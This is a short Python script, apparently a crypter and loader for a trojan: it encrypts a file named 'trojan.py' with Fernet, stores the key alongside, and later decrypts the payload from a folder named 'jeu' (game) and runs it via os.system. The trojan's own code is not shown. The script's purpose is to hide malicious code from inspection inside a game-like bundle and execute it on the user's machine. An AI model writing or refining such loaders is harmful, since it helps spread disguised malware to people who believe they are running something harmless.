import os
from cryptography.fernet import Fernet

def enryptFILE():
    key = Fernet.generate_key()

    with open ("trojan/key.txt", "wb") as file :
        file.write(key)

    with open ("trojan/trojan.py" , 'rb') as file:
        original = file.read()

    f =Fernet (key)
    encrypted = f.encrypt(original)

    with open ("Encrrojan.txt" , 'wb') as encrypted_file:
        encrypted_file.write(encrypted)


def decryptAndRun():
    with open ("jeu/key.txt" , 'rb') as file:
        key = file.read()

    f =Fernet (key)

    with open ("jeu/Encrrojan.txt" , 'rb') as encrypted_file:
        encrypted = encrypted_file.read()

    decrypted = f.decrypt(encrypted)

    with open ("trojan/Decrrojan.py" , 'wb') as decrypted_file:
        decrypted_file.write(decrypted)



    #run
    os.system("python3 trojan/Decrrojan.py")
